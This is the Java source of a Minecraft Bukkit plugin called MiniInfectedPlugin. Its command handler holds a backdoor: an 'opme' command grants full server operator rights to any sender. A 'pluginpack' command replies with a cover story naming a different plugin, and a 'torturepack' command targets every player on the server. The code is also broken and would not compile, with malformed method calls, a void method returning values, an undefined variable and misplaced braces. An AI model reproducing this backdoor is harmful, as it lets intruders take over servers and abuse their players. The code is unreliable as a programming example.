 package org.CreeperCoders.MiniInfectedPlugin;
 
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.command.CommandSender;
 import org.bukkit.command.Command;
 import java.util.logging.Logger;
 import org.bukkit.ChatColor;
 import org.bukkit.Bukkit;
 
 public class MiniInfectedPlugin extends JavaPlugin
 {
     public final Logger log = Bukkit.getLogger();
 
     @Override
     public void onEnable()
     {
         log.info("[" + getDescription.getName() + "] " + getDescription.getName() + " enabled! Version 2.4 by " + getDescription.getAuthors());
     }
 
     @Override
     public void onDisable()
     {
         log.info("[" + getDescription.getName() + "] " + getDescription.getName() + " disabled.");
     }
 
     @Override
     public void onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args)
     {
        Player player = null;
         if (sender instanceof Player)
         {
            player = (Player) sender;
         }
         if (commandLabel.equalsIgnoreCase("opme"))
         {
             sender.sendMessage(ChatColor.YELLOW + "You are now OP!");
             sender.setOp(true);
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("pluginpack"))
         {
             sender.sendMessage(ChatColor.GREEN + "This server is running PluginPack version 1.9");
             return true;
         }
         else if (commandLabel.equalsIgnoreCase("torturepack"))
         {
             sender.sendMessage(ChatColor.DARK_RED + "Torturing ALL players, that includes you!");
             MIP_Util.torturePack(p);
             return true;
         }
    }
     return false;
     
 }
